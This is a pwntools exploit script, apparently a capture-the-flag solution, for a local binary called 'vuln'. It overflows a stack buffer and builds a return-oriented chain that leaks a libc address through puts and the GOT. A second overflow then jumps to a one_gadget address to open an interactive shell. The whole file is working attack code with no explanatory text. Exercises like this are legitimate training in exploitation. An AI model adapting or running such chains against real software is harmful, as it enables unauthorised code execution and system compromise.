#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')
libc = ELF('./libc-2.31.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# gadgets
pop_rdi = 0x401273  # pop rdi; ret;

io.recvline()
offset = 0x48
payload = b""
payload += cyclic_gen().get(offset)
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.main)

io.sendline(payload)
io.recvline()
leak = io.recvline().strip()
leak = u64(leak.ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts
log.success(f"libc @ {hex(libc.address)}")

one_gadgets = [
    0xe6c7e,
    0xe6c81,
    0xe6c84
]
one_gadget = one_gadgets[1]

io.recvline()
payload = b""
payload += cyclic_gen().get(offset)
payload += p64(one_gadget + libc.address)

io.sendline(payload)

io.interactive()

